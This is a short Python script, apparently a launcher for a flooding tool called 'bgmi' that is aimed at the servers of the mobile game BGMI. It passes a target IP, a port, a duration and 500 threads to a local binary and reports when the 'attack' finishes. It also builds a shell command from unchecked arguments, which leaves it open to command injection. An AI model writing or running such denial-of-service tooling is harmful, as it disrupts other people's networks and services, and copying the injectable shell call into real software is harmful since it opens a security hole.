# import os

# def read_bgmi_file():
#     try:
#         current_dir = os.getcwd()
        
#         file_path = os.path.join(current_dir, 'bgmi')  # Adjust the file path as needed
#         with open(file_path, 'r', errors='ignore') as file:  # Ignore decoding errors
#             content = file.read()
#         return content
#     except Exception as e:
#         return str(e)

# if __name__ == "__main__":
#     result = read_bgmi_file()
#     print(result)


import subprocess
import sys

def execute_bgmi_attack(target, port, time):
    # Construct the full command
    full_command = f"./bgmi {target} {port} {time} 500"

    # Execute the command
    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)

    # Check the result
    print(result)
    if result.returncode == 0:
        # Command executed successfully
        response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
    else:
        # Command failed
        response = "Error: BGMI Attack failed."

    return response

# Check if arguments are provided
if len(sys.argv) != 4:
    print("Usage: python attack.py <target> <port> <time>")
    sys.exit(1)

# Extract target, port, and time from command-line arguments
target = sys.argv[1]
port = sys.argv[2]
time = sys.argv[3]

# Execute BGMI attack with provided arguments
response = execute_bgmi_attack(target, port, time)
print(response)
